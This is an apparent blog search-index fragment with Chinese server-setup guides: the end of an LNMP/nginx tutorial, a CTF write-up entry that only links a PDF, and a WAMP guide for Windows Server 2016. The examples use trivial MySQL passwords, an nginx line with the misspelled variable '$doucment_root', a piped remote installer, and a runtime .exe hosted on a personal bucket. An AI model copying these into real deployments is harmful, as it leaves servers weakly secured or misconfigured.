title="主文件模式"></a>主文件模式</h3><p><strong>该步骤选做</strong><br>默认的配置文件</p><p>cp &#x2F;etc&#x2F;nginx&#x2F;nginx.conf &#x2F;etc&#x2F;nginx&#x2F;nginx.conf.bak<br>cp &#x2F;etc&#x2F;nginx&#x2F;nginx.conf.default &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>编辑<code>/etc/nginx/nginx.conf</code>，在所支持的主页面格式中添加php格式的主页，类似如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    root   /usr/local/nginx/html;</span><br><span class="line">    index  index.php index.html index.htm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取消一下内容前面的注释</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    root           /usr/local/nginx/html/;</span><br><span class="line">    fastcgi_pass    127.0.0.1:9000;</span><br><span class="line">    fastcgi_index   index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $doucment_root$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新载入nginx的配置文件。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx reload</span><br></pre></td></tr></table></figure><h3 id="虚拟主机模式"><a href="#虚拟主机模式" class="headerlink" title="虚拟主机模式"></a>虚拟主机模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 80; #监听端口</span><br><span class="line">    listen [::]:80; #IPV6支持</span><br><span class="line">    #listen 443 spdy; #https</span><br><span class="line">    #listen [::]:443 spdy; #IPV6 HTTPS</span><br><span class="line">    server_name www.example.com; #您的域名</span><br><span class="line">    index index.php index.html index.php;</span><br><span class="line"></span><br><span class="line">    set $subdomain &#x27;&#x27;;</span><br><span class="line">    root  /home/www/www_example_com$subdomain;</span><br><span class="line">    #include /home/www/rewrite/xxx.conf; #包含rewrite规则文件</span><br><span class="line">    </span><br><span class="line">    ### SSL 配置，如果您需要，请取消本段的注释并做好配置</span><br><span class="line">    #ssl on;</span><br><span class="line">    #ssl_protocols TLSv1.2 TLSv1.1 TLSv1;</span><br><span class="line">    #ssl_ciphers CHACHA20:GCM:CFB:HIGH:!DH:!RC4:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS;</span><br><span class="line">    #add_header Strict-Transport-Security &quot;max-age=31536000; includeSubdomains; preload&quot;;</span><br><span class="line">    #ssl_prefer_server_ciphers on;</span><br><span class="line">    #ssl_stapling on;</span><br><span class="line">    #ssl_stapling_verify on;</span><br><span class="line">    #ssl_certificate /path/to/public.crt;</span><br><span class="line">    #ssl_certificate_key /path/to/private.key;</span><br><span class="line">    ############</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ </span><br><span class="line">    &#123;</span><br><span class="line">        root            /home/www/www_example_com/;</span><br><span class="line">        fastcgi_pass    127.0.0.1:9000;</span><br><span class="line">        fastcgi_index   index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  /home/www/www_example_com/$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*.(gif|jpg|jpeg|png|bmp|swf|flv|mp3|wma)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      30d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*.(js|css)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      12h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    access_log off; </span><br><span class="line">    error_log /dev/null; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="安装composer"><a href="#安装composer" class="headerlink" title="安装composer"></a>安装composer</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -sS https://getcomposer.org/installer | php</span><br><span class="line">mv composer.phar /usr/local/bin/composer</span><br></pre></td></tr></table></figure><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>此时mysql是空密码。</p><p>安全起见，需要设置密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; set password for &#x27;root&#x27;@&#x27;localhost&#x27;=password(&#x27;123&#x27;);</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure><p>nginx设置后可能会出现报错<code>File not found</code><br>检查<code>location ~ .php$ </code>配置项，发现了一行<code>fastcgi_param</code>的配置，然后将其改成了nginx的默认web目录，再次重启nginx服务后，发现可以进行访问了。<br><code>fastcgi_param  SCRIPT_FILENAME /home/www/www_example_com/$fastcgi_script_name;</code></p><p>至此 LNMP部署完毕</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-NUCA CTF 1~3 Write-Up</title>
      <link href="/p/3354270344.html"/>
      <url>/p/3354270344.html</url>
      
        <content type="html"><![CDATA[<p>2017年XNUCA Writeup</p><span id="more"></span><p><strong>第一次玩这个，直接PDF文件吧</strong><br><strong>第四关加了个WAF过不去 mmp。。。。</strong><br><strong>1~3关WRITEUP</strong></p><p><a href="http://cnspace-1251949277.cosbj.myqcloud.com/pdf/QISI.pdf">下载PDF</a></p>]]></content>
      
      
      <categories>
          
          <category> X-NUCA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下部署WAMP</title>
      <link href="/p/1786556225.html"/>
      <url>/p/1786556225.html</url>
      
        <content type="html"><![CDATA[<p>记录下Windows Server 2016 X64下手动部署Apache 2.4.29+MySQL5.7+PHP7+phpMyAdmin4.7.6</p><span id="more"></span><p>环境：</p><blockquote><p>Windows Server2016 DataCenter x64<br>Apache2.4.9<br>PHP7.2<br>MySQL5.7.2<br>phpMyAdmin4.7.6</p></blockquote><p>系统需要安装VC常用环境，文末提供下载。</p><hr><h1 id="Apache下载-amp-配置"><a href="#Apache下载-amp-配置" class="headerlink" title="Apache下载&amp;配置"></a>Apache下载&amp;配置</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>Apache官网下载<code>http://httpd.apache.org/</code><br>下载最新的Apache<br><img src="/images/9cibSkm.png"><br>由于Apache没有编译好的可执行文件因此只能下载别的平台编译好的<br><img src="/images/6Q3euV3.png"><br>这里我们第一个ApacheHaus为例。<br><img src="/images/lqzschB.png"><br>这里以VC14为例<br><img src="/images/WJIhIwo.png"><br>下载，注意64位和32位以及OpenSSL模块版本<br><img src="/images/HcBGfxh.png"><br>下载完是个压缩包<br><img src="/images/s2QrIhE.png"><br>移动到想放的地方并解压<strong>（D盘为例）</strong><br>然后把解压后的Apache24目录移动到D盘根目录<br>最后效果如下<br><img src="/images/ojLqMfu.png"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>CMD进入<code>Apache</code>的<code>bin</code>目录<br>CMD执行<code>httpd -?</code>可以看到httpd所有可用参数</p><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">D:\Apache24\bin&gt;httpd -?</span><br><span class="line">Usage: httpd [-<span class="type">D</span> <span class="type">name</span>] [-<span class="type">d</span> <span class="type">directory</span>] [-<span class="type">f</span> <span class="type">file</span>]</span><br><span class="line">             [-<span class="type">C</span> <span class="string">&quot;directive&quot;</span>] [-<span class="type">c</span> <span class="string">&quot;directive&quot;</span>]</span><br><span class="line">             [-<span class="type">w</span>] [-<span class="type">k</span> <span class="type">start</span>|<span class="type">restart</span>|<span class="type">stop</span>|<span class="type">shutdown</span>] [-<span class="type">n</span> <span class="type">service_name</span>]</span><br><span class="line">             [-<span class="type">k</span> <span class="type">install</span>|<span class="type">config</span>|<span class="type">uninstall</span>] [-<span class="type">n</span> <span class="type">service_name</span>]</span><br><span class="line">             [-<span class="type">v</span>] [-<span class="type">V</span>] [-<span class="type">h</span>] [-<span class="type">l</span>] [-<span class="type">L</span>] [-<span class="type">t</span>] [-<span class="type">T</span>] [-<span class="type">S</span>] [-<span class="type">X</span>]</span><br><span class="line">Options:</span><br><span class="line">  <span class="literal">-D</span> name            : define a name <span class="keyword">for</span> use <span class="keyword">in</span> &lt;IfDefine name&gt; directives</span><br><span class="line">  <span class="literal">-d</span> directory       : specify an alternate initial ServerRoot</span><br><span class="line">  <span class="operator">-f</span> file            : specify an alternate ServerConfigFile</span><br><span class="line">  <span class="literal">-C</span> <span class="string">&quot;directive&quot;</span>     : <span class="keyword">process</span> directive before reading config files</span><br><span class="line">  <span class="literal">-c</span> <span class="string">&quot;directive&quot;</span>     : <span class="keyword">process</span> directive after reading config files</span><br><span class="line">  <span class="literal">-n</span> name            : <span class="built_in">set</span> service name and use its ServerConfigFile and ServerRoot</span><br><span class="line">  <span class="literal">-k</span> <span class="built_in">start</span>           : tell Apache to <span class="built_in">start</span></span><br><span class="line">  <span class="literal">-k</span> restart         : tell running Apache to <span class="keyword">do</span> a graceful restart</span><br><span class="line">  <span class="literal">-k</span> stop|shutdown   : tell running Apache to shutdown</span><br><span class="line">  <span class="literal">-k</span> install         : install an Apache service</span><br><span class="line">  <span class="literal">-k</span> config          : change startup Options of an Apache service</span><br><span class="line">  <span class="literal">-k</span> uninstall       : uninstall an Apache service</span><br><span class="line">  <span class="literal">-w</span>                 : hold open the console window on error</span><br><span class="line">  <span class="literal">-e</span> level           : show startup errors of level (see LogLevel)</span><br><span class="line">  <span class="literal">-E</span> file            : log startup errors to file</span><br><span class="line">  <span class="literal">-v</span>                 : show version number</span><br><span class="line">  <span class="literal">-V</span>                 : show compile settings</span><br><span class="line">  <span class="literal">-h</span>                 : list available command line options (this page)</span><br><span class="line">  <span class="literal">-l</span>                 : list compiled <span class="keyword">in</span> modules</span><br><span class="line">  <span class="literal">-L</span>                 : list available configuration directives</span><br><span class="line">  <span class="literal">-t</span> <span class="literal">-D</span> DUMP_VHOSTS  : show parsed vhost settings</span><br><span class="line">  <span class="literal">-t</span> <span class="literal">-D</span> DUMP_RUN_CFG : show parsed run settings</span><br><span class="line">  <span class="literal">-S</span>                 : a synonym <span class="keyword">for</span> <span class="literal">-t</span> <span class="literal">-D</span> DUMP_VHOSTS <span class="literal">-D</span> DUMP_RUN_CFG</span><br><span class="line">  <span class="literal">-t</span> <span class="literal">-D</span> DUMP_MODULES : show all loaded modules</span><br><span class="line">  <span class="literal">-M</span>                 : a synonym <span class="keyword">for</span> <span class="literal">-t</span> <span class="literal">-D</span> DUMP_MODULES</span><br><span class="line">  <span class="literal">-t</span> <span class="literal">-D</span> DUMP_INCLUDES: show all included configuration files</span><br><span class="line">  <span class="literal">-t</span>                 : run syntax check <span class="keyword">for</span> config files</span><br><span class="line">  <span class="literal">-T</span>                 : <span class="built_in">start</span> without DocumentRoot(s) check</span><br><span class="line">  <span class="literal">-X</span>                 : debug mode (only one worker, <span class="keyword">do</span> not detach)</span><br></pre></td></tr></table></figure><p>这里因为要安装为服务且不用默认名，所以执行<br>    httpd -n Apache24_test -k install<br>执行完会报错，因为#<code>httpd.conf</code>第38行左右没有设置正确路径（默认是<code>/Apache24</code>）<br><img src="/images/oEvuV9o.png"><br>找到第38行，然后改为正确的<code>Apache24</code>根路径</p><blockquote></blockquote><p>Define SRVROOT “D:\Apache24”<br>ServerRoot “${SRVROOT}”</p><p>默认网站路径是<code>$&#123;SRVROOT&#125;\htdocs</code>,在<code>httpd.conf</code>中<code>251</code>行左右可以修改，我修改为<code>$&#123;SRVROOT&#125;\WWW</code></p><p>然后进入服务中启动Apache24进程即可，或者用<code>ApacheMonitor.exe</code>【推荐】进行控制<br><img src="/images/1bmqmit.png"><br>浏览器访问localhost，见到如下图界面即为配置且启动成功<br><img src="/images/GPRF0L2.png"></p><hr><h1 id="PHP下载-安装"><a href="#PHP下载-安装" class="headerlink" title="PHP下载+安装"></a>PHP下载+安装</h1><h2 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h2><p>PHP官网下载网址<code>http://www.php.net/downloads.php</code><br><img src="/images/JXDLgsw.png"><br>这里我选择线程安全X64版本<br><img src="/images/VX0lgA6.png"><br>下载后<br><img src="/images/xDqzKMT.png"></p><h2 id="安装【解压】"><a href="#安装【解压】" class="headerlink" title="安装【解压】"></a>安装【解压】</h2><p>解压到D盘，目录重命名为PHP7<br><img src="/images/WwhwRFi.png"><br>然后进入<code>D:\PHP7</code>修改<code>php.ini-development</code>为<code>php.ini</code><br><img src="/images/XbOVcWX.png"><br><code>development</code>为开发环境，<code>production</code>为产品环境，如果要上线，更改<code>production</code>为<code>php.ini</code><br>然后设置环境变量<br><img src="/images/liZa1hT.png"><br>测试是否成功<br>cmd执行php –v<br><img src="/images/Im3Ogqv.png"></p><h2 id="整合进Apache"><a href="#整合进Apache" class="headerlink" title="整合进Apache"></a>整合进Apache</h2><p>进入<code>D:\Apache24\conf</code>目录对<code>httpd.conf</code>文件进行编辑<br>在<code>181</code>行后添加PHP支持【<code>httpd.conf</code>文件注释语法为<code>#</code>】</p><blockquote><p>LoadModule php7_module D:&#x2F;php7&#x2F;php7apache2_4.dll<br>AddType application&#x2F;x-httpd-php .php<br>PhpIniDir D:&#x2F;php7</p></blockquote><p>文件改后如下图所示<br><img src="/images/VoCF1GD.png"></p><h2 id="配置PHP支持MySQL"><a href="#配置PHP支持MySQL" class="headerlink" title="配置PHP支持MySQL"></a>配置PHP支持MySQL</h2><p>进入<code>D:/php7</code>，编辑<code>php.ini</code>中<code>898</code>行和<code>902</code>行左右，使PHP对MySQL支持【PHP中注释为;】<br><img src="/images/IO0UMnN.png"></p><h2 id="设置拓展目录"><a href="#设置拓展目录" class="headerlink" title="设置拓展目录"></a>设置拓展目录</h2><p>编辑<code>732</code>行，设置PHP拓展目录<br><img src="/images/m0XviPS.png"></p><h2 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h2><p>编辑<code>932</code>为<code>date.timezone = PRC</code><br><img src="/images/cPG1AKh.png"></p><h2 id="Apache设置PHP首页文件"><a href="#Apache设置PHP首页文件" class="headerlink" title="Apache设置PHP首页文件"></a>Apache设置PHP首页文件</h2><p>编辑<code>httpd.conf</code>第<code>284</code>行<br><img src="/images/UAlgBNi.png"></p><h2 id="测试PHP-Apache"><a href="#测试PHP-Apache" class="headerlink" title="测试PHP+Apache"></a>测试PHP+Apache</h2><p>在<code>D:\Apache24\WWW</code>下新建index.php文件，内容是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>保存，本地访问localhost，出现如下图表示配置成功<br><img src="/images/Wymd1r8.png"></p><hr><h1 id="下载-amp-配置MySQL"><a href="#下载-amp-配置MySQL" class="headerlink" title="下载&amp;配置MySQL"></a>下载&amp;配置MySQL</h1><h2 id="下载-2"><a href="#下载-2" class="headerlink" title="下载"></a>下载</h2><p>下载地址<code>https://dev.mysql.com/downloads/mysql/</code><br>进入后往下拉<br><img src="/images/2a3nYxa.png"><br>选择X64版本的Zip是因为方便【好吧，我承认我懒】，图片中下面那个是用于开发测试的版本<br>这一步会提示登录帐号，不用管，直接下载<br><img src="/images/BMIaXZb.png"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>下载后解压重命名为<code>mysql57</code>并移动到D盘根目录，这时D盘目录如下图<br><img src="/images/8ci70fB.png"><br>然后进入<code>mysql</code>根目录，新建<strong>data空文件夹</strong>和<code>my.ini</code><br><code>my.ini</code>代码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysql]</span><br><span class="line"># 设置mysql客户端默认字符集</span><br><span class="line">default-character-set=utf8 </span><br><span class="line">[mysqld]</span><br><span class="line">#设置3306端口</span><br><span class="line">port = 3306 </span><br><span class="line"># 设置mysql的安装目录</span><br><span class="line">basedir=D:\mysql57</span><br><span class="line"># 设置mysql数据库的数据的存放目录</span><br><span class="line">datadir=D:\mysql57\data</span><br><span class="line"># 允许最大连接数</span><br><span class="line">max_connections=200</span><br><span class="line"># 服务端使用的字符集默认为8比特编码的latin1字符集</span><br><span class="line">character-set-server=utf8</span><br><span class="line"># 创建新表时将使用的默认存储引擎</span><br><span class="line">default-storage-engine=INNODB </span><br></pre></td></tr></table></figure><p>保存后cmd进入<code>mysql57/bin</code><br>执行<code>mysqld --verbose --help</code>会提示帮助</p><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">D:\mysql57\bin&gt;mysqld <span class="literal">--verbose</span> <span class="literal">--help</span></span><br><span class="line">mysqld  Ver <span class="number">5.7</span>.<span class="number">20</span> <span class="keyword">for</span> Win64 on x86_64 (MySQL Community Server (GPL))</span><br><span class="line">Copyright (c) <span class="number">2000</span>, <span class="number">2017</span>, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Starts the MySQL database server.</span><br><span class="line"></span><br><span class="line">Usage: mysqld [<span class="type">OPTIONS</span>]</span><br><span class="line">NT and Win32 specific options:</span><br><span class="line">  <span class="literal">--install</span>                     Install the default service (NT).</span><br><span class="line">  <span class="literal">--install-manual</span>              Install the default service started manually (NT).</span><br><span class="line">  <span class="literal">--install</span> service_name        Install an optional service (NT).</span><br><span class="line">  <span class="literal">--install-manual</span> service_name Install an optional service started manually (NT).</span><br><span class="line">  <span class="literal">--remove</span>                      Remove the default service from the service list (NT).</span><br><span class="line">  <span class="literal">--remove</span> service_name         Remove the service_name from the service list (NT).</span><br><span class="line">  <span class="literal">--enable-named-pipe</span>           Only to be used <span class="keyword">for</span> the default server (NT).</span><br><span class="line">  <span class="literal">--standalone</span>                  Dummy option to <span class="built_in">start</span> as a standalone server (NT).</span><br><span class="line">以下省略</span><br></pre></td></tr></table></figure><p>执行<code>mysqld --initialize-insecure --user=mysql</code>，文档表明，MySQL5.7.6后自带数据库，使用-initialize生成随机密码，使用-initialize-insecure生成空密码。默认帐号root,后面的-user&#x3D;mysql不更改<br><img src="/images/xY6QbMW.png"><br>然后<code>bin</code>目录下执行<code>mysqld install mysql57</code><br><img src="/images/eUtASIX.png"><br>由于默认是空密码，所以执行<code>mysqladmin -u root -p password</code>设置密码<br><img src="/images/kSrHeYb.png"><br>然后执行<code>net start mysql57</code><br><img src="/images/3KbH4Jx.png"></p><p>方便以后使用，新建环境变量<code>D:\mysql57\bin</code><br><img src="/images/JaB7A4a.png"></p><h2 id="测试连接数据库"><a href="#测试连接数据库" class="headerlink" title="测试连接数据库"></a>测试连接数据库</h2><p>代码如下<br>    test.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;123456789&#x27;</span>);<span class="comment">//如果连接成功,会返回一个连接的标识，PHP7中去除了mysql_connect，改用mysqli_connect;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$link</span>)&#123; <span class="comment">//如果有数据库连接标识,则为连接成功</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接数据库成功&quot;</span>; <span class="comment">//echo是输出的意思</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123; <span class="comment">//没有返回标识,则连接数据库失败</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接数据库失败&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/qG1I8CW.png"></p><h1 id="配置phpMyAdmin"><a href="#配置phpMyAdmin" class="headerlink" title="配置phpMyAdmin"></a>配置phpMyAdmin</h1><p>下载连接：<code>https://www.phpmyadmin.net/</code><br><img src="/images/RwtkJH3.png"></p><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><p>解压，改名为<code>phpMyAdmin</code>扔进<code>web</code>目录<code>【D:\Apache24\WWW】</code><br><img src="/images/SPhbUQK.png"></p><h2 id="config-inc-php"><a href="#config-inc-php" class="headerlink" title="config.inc.php"></a>config.inc.php</h2><p>然后修改<code>phpMyAdmin</code>目录下的<code>config.sample.inc.php</code>为<code>config.inc.php</code>然后打开，编辑17行左右的<code>$cfg[&#39;blowfish_secret&#39;]=&#39;&#39;;</code>为<code>$cfg[&#39;blowfish_secret&#39;]=&#39;AbCdEfGhIjKlMn&#39;;</code>【任意字符串】<br><img src="/images/D5IEJyb.png"></p><h2 id="config-default-php"><a href="#config-default-php" class="headerlink" title="config.default.php"></a>config.default.php</h2><p>文件路径：<code>D:\Apache24\WWW\phpMyAdmin\libraries\config.default.php</code><br>修改以下项目：</p><h3 id="a-访问网址"><a href="#a-访问网址" class="headerlink" title="a.访问网址"></a>a.访问网址</h3><pre><code>$cfg[&#39;pmaabsoluteuri&#39;] = &#39;&#39;;这里填写phpmyadmin的访问网址</code></pre><h4 id="b-mysql主机信息"><a href="#b-mysql主机信息" class="headerlink" title="b.mysql主机信息"></a>b.mysql主机信息</h4><p><code>$cfg[&#39;servers&#39;][$i][&#39;host&#39;] = &#39;localhost&#39;; // mysql hostname or ip address 填写localhost或mysql所在服务器的ip地址，如果mysql和该phpmyadmin在同一服务器，则按默认localhost $cfg[&#39;servers&#39;][$i][&#39;port&#39;] = &#39;&#39;; // mysql port - leave blank for default port mysql端口，如果是默认3306，保留为空即可</code></p><h3 id="c-mysql用户名和密码"><a href="#c-mysql用户名和密码" class="headerlink" title="c.mysql用户名和密码"></a>c.mysql用户名和密码</h3><pre><code>$cfg[&#39;servers&#39;][$i][&#39;user&#39;] = &#39;root&#39;; // mysql user访问phpmyadmin使用的mysql用户名fg[&#39;servers&#39;][$i][&#39;password&#39;] = &#39;&#39;; // mysql password (only needed对应上述mysql用户名的密码</code></pre><h3 id="d-认证方法"><a href="#d-认证方法" class="headerlink" title="d.认证方法"></a>d.认证方法</h3><pre><code>$cfg[&#39;servers&#39;][$i][&#39;auth_type&#39;] = &#39;cookie&#39;;</code></pre><p>在此有四种模式可供选择，<code>cookie，http，http，config</code><br>config方式即输入phpmyadmin的访问网址即可直接进入，无需输入用户名和密码，是<strong>不安全的</strong>，<strong>不推荐使用</strong>。<br>当该项设置为<code>cookie，http</code>或<code>http</code>时，登录<code>phpmyadmin</code>需要数据用户名和密码进行验证，,具体如下：</p><ol><li>php安装模式为<code>Apache</code>，可以使用<code>http</code>和<code>cookie</code>;</li><li>php安装模式为<code>cgi</code>，可以使用<code>cookie</code></li></ol><h3 id="e-短语密码-blowfish-secret-的设置"><a href="#e-短语密码-blowfish-secret-的设置" class="headerlink" title="e.短语密码(blowfish_secret)的设置"></a>e.短语密码(blowfish_secret)的设置</h3><pre><code>$cfg[&#39;blowfish_secret&#39;] = &#39;&#39;;</code></pre><p>如果认证方法设置为cookie，就需要设置短语密码，置于设置为什么密码，由您自己决定 ，但是不能留空，否则会在登录phpmyadmin时提示错误</p><p>不出意外的话访问localhost&#x2F;phpmyadmin会出现以下界面<br><img src="/images/zURxpo8.png"><br>输入数据库帐号密码即可登录<br><img src="/images/2tzhlLA.png"></p><hr><p>至此，WAMP环境配置完毕，可正常使用了。<br>附<br>测试时区代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;现在时间为: &quot;</span><span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="VC常用库下载"><a href="#VC常用库下载" class="headerlink" title="VC常用库下载"></a>VC常用库下载</h1><p><a href="http://cnspace-1251949277.cosbj.myqcloud.com/files/%E5%BE%AE%E8%BD%AF%E5%B8%B8%E7%94%A8%E8%BF%90%E8%A1%8C%E5%BA%93%E5%90%88%E9%9B%8664%E4%BD%8D_2017.10.25.exe">点击下载</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows Server </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
